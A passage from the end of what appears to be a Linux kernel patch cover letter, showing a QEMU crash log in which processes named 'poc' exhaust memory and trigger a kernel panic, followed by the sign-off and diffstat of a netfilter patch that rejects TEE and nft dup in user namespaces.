[   18.785540] [    220]     0   220    14097      429      391       38         0   102400        0             0 nginx
[   18.785542] [    221]    33   221    14191      544      471       73         0   102400        0             0 nginx
[   18.785543] [    222]    33   222    14191      544      471       73         0   102400        0             0 nginx
[   18.785545] [    247]     0   247     3453      611      289      322         0    61440        0             0 sshd
[   18.785546] [    253]     0   253     1429      175       76       99         0    53248        0             0 bash
[   18.785548] [    284]     0   284     1132       75       30       45         0    49152        0             0 poc
[   18.785549] [    289]     0   289     1132       75       30       45         0    49152        0             0 poc
[   18.785551] [    294]     0   294     1132       74       29       45         0    49152        0             0 poc
[   18.785552] [    299]     0   299     1132       75       30       45         0    53248        0             0 poc
[   18.785553] [    304]     0   304     1132       76       31       45         0    49152        0             0 poc
[   18.785555] [    309]     0   309     1132       75       30       45         0    45056        0             0 poc
[   18.785557] [    314]     0   314     1132       76       31       45         0    49152        0             0 poc
[   18.785558] [    319]     0   319     1132       75       30       45         0    53248        0             0 poc
[   18.785559] [    324]     0   324     1132       74       29       45         0    49152        0             0 poc
[   18.785561] [    329]     0   329     1132       74       29       45         0    49152        0             0 poc
[   18.785562] [    334]     0   334     1132       76       31       45         0    45056        0             0 poc
[   18.785563] [    339]     0   339     1132       75       30       45         0    53248        0             0 poc
[   18.785565] [    344]     0   344     1132       75       30       45         0    49152        0             0 poc
[   18.785566] [    349]     0   349     1132       74       29       45         0    49152        0             0 poc
[   18.785567] [    354]     0   354     1132       75       30       45         0    57344        0             0 poc
[   18.785569] [    359]     0   359     1132       75       30       45         0    49152        0             0 poc
[   18.785571] [    364]     0   364     1132       74       29       45         0    45056        0             0 poc
[   18.785572] [    369]     0   369     1132       75       30       45         0    49152        0             0 poc
[   18.785573] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[   24.331707] CPU: 0 UID: 0 PID: 151 Comm: in:imklog Not tainted 7.3.0-rc3-nfdup-userns-v4+ #1 PREEMPT(lazy) 
[   24.362669] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   24.409517] Call Trace:
[   24.413508]  <TASK>
[   24.416216]  vpanic (??:?)
[   24.421716]  panic (??:?)
[   24.431488]  out_of_memory (??:?)
[   24.447655]  __alloc_frozen_pages_noprof (??:?)
[   24.460673]  ? blk_finish_plug (??:?)
[   24.471956]  alloc_pages_mpol (mempolicy.c:?)
[   24.487290]  folio_alloc_noprof (??:?)
[   24.500585]  __filemap_get_folio_mpol (??:?)
[   24.515267]  filemap_fault (??:?)
[   24.526120]  __do_fault (memory.c:?)
[   24.535019]  __handle_mm_fault (memory.c:?)
[   24.546231]  handle_mm_fault (??:?)
[   24.564328]  do_user_addr_fault (fault.c:?)
[   24.575188]  exc_page_fault (??:?)
[   24.587329]  asm_exc_page_fault (??:?)
[   24.605362] RIP: 0033:0x7fc1cf0de492
[   24.615827] Code: 89 07 31 c0 c3 0f 1f 00 41 54 55 53 48 8b 2f 80 7d 00 3c 75 73 49 89 fc 48 89 f3 e8 c8 fe ff ff 4c 8b 00 0f b6 45 01 48 89 c2 <41> f6 44 40 01 08 74 56 48 8d 4d 01 31 c0 eb 0c 66 0f 1f 44 00 00
All code
========
   0:	89 07                	mov    %eax,(%rdi)
   2:	31 c0                	xor    %eax,%eax
   4:	c3                   	ret
   5:	0f 1f 00             	nopl   (%rax)
   8:	41 54                	push   %r12
   a:	55                   	push   %rbp
   b:	53                   	push   %rbx
   c:	48 8b 2f             	mov    (%rdi),%rbp
   f:	80 7d 00 3c          	cmpb   $0x3c,0x0(%rbp)
  13:	75 73                	jne    0x88
  15:	49 89 fc             	mov    %rdi,%r12
  18:	48 89 f3             	mov    %rsi,%rbx
  1b:	e8 c8 fe ff ff       	call   0xfffffffffffffee8
  20:	4c 8b 00             	mov    (%rax),%r8
  23:	0f b6 45 01          	movzbl 0x1(%rbp),%eax
  27:	48 89 c2             	mov    %rax,%rdx
  2a:*	41 f6 44 40 01 08    	testb  $0x8,0x1(%r8,%rax,2)		<-- trapping instruction
  30:	74 56                	je     0x88
  32:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
  36:	31 c0                	xor    %eax,%eax
  38:	eb 0c                	jmp    0x46
  3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

Code starting with the faulting instruction
===========================================
   0:	41 f6 44 40 01 08    	testb  $0x8,0x1(%r8,%rax,2)
   6:	74 56                	je     0x5e
   8:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   c:	31 c0                	xor    %eax,%eax
   e:	eb 0c                	jmp    0x1c
  10:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
[   24.699787] RSP: 002b:00007fc1cebf53e0 EFLAGS: 00010203
[   24.712851] RAX: 0000000000000034 RBX: 00007fc1cebf540c RCX: 0000000000000000
[   24.733040] RDX: 0000000000000034 RSI: 00007fc1cebf540c RDI: 00007fc1cebf5400
[   24.759486] RBP: 00007fc1cebf5d00 R08: 00007fc1cf5243c0 R09: 0000560c44c3be68
[   24.780577] R10: a3d70a3d70a3d70b R11: 0000000000000000 R12: 00007fc1cebf5400
[   24.799710] R13: 0000560c44c3f4a0 R14: 00007fc1cebf5d00 R15: 00007fc1cebf5d86
[   24.821184]  </TASK>
[   24.830066] Kernel Offset: 0x17a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   24.865890] ---[ end Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled ]---
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  netfilter: nf_dup: reject TEE and IPv4/IPv6/netdev nft dup in userns

 net/ipv4/netfilter/nft_dup_ipv4.c | 4 ++++
 net/ipv6/netfilter/nft_dup_ipv6.c | 4 ++++
 net/netfilter/nft_dup_netdev.c    | 4 ++++
 net/netfilter/xt_TEE.c            | 4 ++++
 4 files changed, 16 insertions(+)

-- 
2.43.0

